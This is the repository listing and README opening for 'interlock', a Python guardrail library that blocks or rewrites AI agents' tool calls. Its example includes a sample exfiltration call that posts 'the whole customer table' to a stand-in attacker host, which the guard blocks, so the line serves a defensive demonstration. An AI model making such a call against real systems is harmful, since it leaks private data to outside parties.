---
repo: "SourceShift/InterLock"
name: "InterLock"
description: "In-process guardrails for AI agents. Block or rewrite tool, MCP, and model calls before they run: 100+ detectors, hierarchical policy scopes, fail-closed by default!"
readmeQualityOk: true
url: "https://github.com/SourceShift/InterLock"
homepage: "https://interlock.sourceshift.ai/"
language: "Python"
languages: ["Python"]
languagePcts: [79]
topics: ["agent-security", "ai-agents", "ai-guardrails", "ai-safety", "guardrails", "langchain", "llm-security", "mcp", "policy-as-code", "prompt-injection"]
stars: 7
forks: 1
openIssues: 0
closedIssues: 0
watchers: 3
contributors: 2
recentReleases: 1
createdAt: "2026-09-26T06:01:33Z"
lastCommitAt: "2026-10-25T02:47:50Z"
lastReleaseAt: "2026-10-13T16:15:23Z"
status: "newborn"
tags: ["solo_builder", "hidden_gem"]
healthScore: 69
undervaluedScore: 51
maintainers: ["amirkhakshour", "amir"]
openGraphImageUrl: "https://opengraph.githubassets.com/2403bb3b4bc4bdc3c3f866138bba3e55110505dc9884f5f45f11e65bb7cc1025/SourceShift/InterLock"
---

# interlock

**Stop a bad tool call before your AI agent makes it.**

interlock checks every tool call your agent makes, inside the agent's own
process, and allows, blocks, or rewrites it before anything happens. No proxy,
no account, no network calls, and no dependencies.

```python
import interlock
from interlock import Blocked, guard
from interlock.detectors import network_egress_guard, pii_redaction_guard

@guard()
def http_post(url: str, body: str) -> str:
    return f"posted to {url}: {body}"

interlock.install(rules=[
    network_egress_guard(allowed_hosts=["api.acme.com"]),   # only talk to hosts you trust
    pii_redaction_guard(),                                  # mask secrets and personal data
])

http_post("https://api.acme.com/notes", "Card on file: 4111 1111 1111 1111")
# -> "posted to https://api.acme.com/notes: Card on file: [REDACTED CREDIT_CARD]"

http_post("https://evil.example/collect", "the whole customer table")
# -> raises Blocked: blocked action 'http_post': egress to 'evil.example' is not on the destination allowlist
```

The first call went through with the card number masked. The second never ran.

### See it run…
